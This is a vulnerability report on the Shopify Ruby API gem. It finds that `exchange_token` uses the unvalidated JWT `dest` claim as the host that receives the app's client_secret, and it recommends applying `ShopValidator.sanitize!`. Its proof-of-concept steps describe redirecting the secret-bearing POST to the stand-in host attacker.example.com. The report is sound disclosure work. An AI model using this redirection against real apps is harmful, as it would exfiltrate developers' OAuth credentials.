### Title
Missing shop-domain validation in `TokenExchange.exchange_token` lets the JWT `dest` claim set the host that receives the app's `client_secret` - ([File: lib/shopify_api/auth/token_exchange.rb])

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the token-exchange request host directly from the unvalidated `dest` claim of the caller-supplied session token, unlike the sibling methods `ClientCredentials.client_credentials` and `TokenExchange.migrate_to_expiring_token`, which both sanitize the `shop` value with `Utils::ShopValidator.sanitize!` before using it to build the outbound request host.

### Finding Description
`exchange_token` takes the `shop` value straight from the session token payload: [1](#0-0) 

`jwt_payload.shop` is simply `@dest.gsub("https://", "")` with no domain-format check: [2](#0-1) 

`JwtPayload#initialize` only verifies the JWT signature and that `aud == Context.api_key` — it never checks that `dest`/`iss` resolve to a value in `Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS`: [3](#0-2) 

The resulting `dest_shop` is used to build a `Session` whose `shop` field becomes the literal HTTP host for the token-exchange POST that carries the app's `client_id`/`client_secret`:

`HttpClient#initialize` sets `@base_uri = "https://#{api_host || session.shop}"`, so absent an explicit `Context.api_host` override, the request host is exactly `session.shop`: [4](#0-3) 

By contrast, the two other flows that build a `Session` purely from a caller-supplied `shop` string both explicitly bind that value to a trusted Shopify domain before using it as the request host: [5](#0-4) [6](#0-5) 

`Utils::ShopValidator.sanitize!` exists precisely to enforce that a shop string is one of `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`): [7](#0-6) 

`exchange_token` skips this call entirely, so the binding "host that receives `client_secret` == a trusted Shopify domain" is enforced everywhere except this one path.

### Impact Explanation
If the `dest` claim in a session token accepted by `JwtPayload` (valid signature + matching `aud`) is not constrained to a Shopify-owned domain, `exchange_token` will send an HTTP POST containing `client_id` and `client_secret` — the app's confidential OAuth credential — to whatever host that claim names. This matches the "SSRF with the app's credentials" / credential-leakage impact class, since the `client_secret` is exfiltrated to an attacker-influenced destination rather than only ever being sent to `*.myshopify.com`-family hosts.

### Likelihood Explanation
Exploitability is bounded by how strictly Shopify's own session-token issuance constrains the `dest` value; this gem itself performs no independent check, so it fully relies on that external guarantee for a value that other code paths in this same library treat as untrusted input requiring `ShopValidator.sanitize!`. The inconsistency between `client_credentials`/`migrate_to_expiring_token` (validated) and `exchange_token` (unvalidated) shows the gem's own security model treats this as a value that must be validated before being used as a network destination for the secret.

### Recommendation
In `ShopifyAPI::Auth::TokenExchange.exchange_token`, apply `Utils::ShopValidator.sanitize!(dest_shop)` (mirroring `migrate_to_expiring_token` and `client_credentials`) before constructing `shop_session`/`Session.from`, so the token-exchange request host is always confined to `Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
1. Obtain (or cause the host application to accept) a session token whose payload has `aud` equal to the app's `api_key` but `dest` set to a non-Shopify host (e.g. `attacker.example.com`).
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. `JwtPayload.new` accepts the token (signature + `aud` check only) and returns `shop == "attacker.example.com"`.
4. `HttpClient.new(session: shop_session, ...)` builds `@base_uri = "https://attacker.example.com"`.
5. `client.request(...)` issues `POST https://attacker.example.com/admin/oauth/access_token` with body containing `client_id` and `client_secret` in the clear.

### Citations

**File:** lib/shopify_api/auth/token_exchange.rb (L39-51)
```ruby
          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-115)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: non_expiring_offline_token,
            subject_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            requested_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            expiring: "1",
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L23-45)
```ruby
      sig { params(token: String).void }
      def initialize(token)
        payload_hash = begin
          decode_token(token, Context.api_secret_key)
        rescue ShopifyAPI::Errors::InvalidJwtTokenError
          raise unless Context.old_api_secret_key

          decode_token(token, T.must(Context.old_api_secret_key))
        end

        @iss = T.let(payload_hash["iss"], String)
        @dest = T.let(payload_hash["dest"], String)
        @aud = T.let(payload_hash["aud"], String)
        @sub = T.let(payload_hash["sub"], T.nilable(String))
        @exp = T.let(payload_hash["exp"], Integer)
        @nbf = T.let(payload_hash["nbf"], Integer)
        @iat = T.let(payload_hash["iat"], Integer)
        @jti = T.let(payload_hash["jti"], String)
        @sid = T.let(payload_hash["sid"], T.nilable(String))

        raise ShopifyAPI::Errors::InvalidJwtTokenError,
          "Session token had invalid API key" unless @aud == Context.api_key
      end
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-51)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
      alias_method :shopify_domain, :shop
```

**File:** lib/shopify_api/clients/http_client.rb (L11-19)
```ruby
      sig { params(base_path: String, session: T.nilable(Auth::Session)).void }
      def initialize(base_path:, session: nil)
        session ||= Context.active_session
        raise Errors::NoActiveSessionError, "No passed or active session" unless session

        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-33)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: CLIENT_CREDENTIALS_GRANT_TYPE,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-18)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```
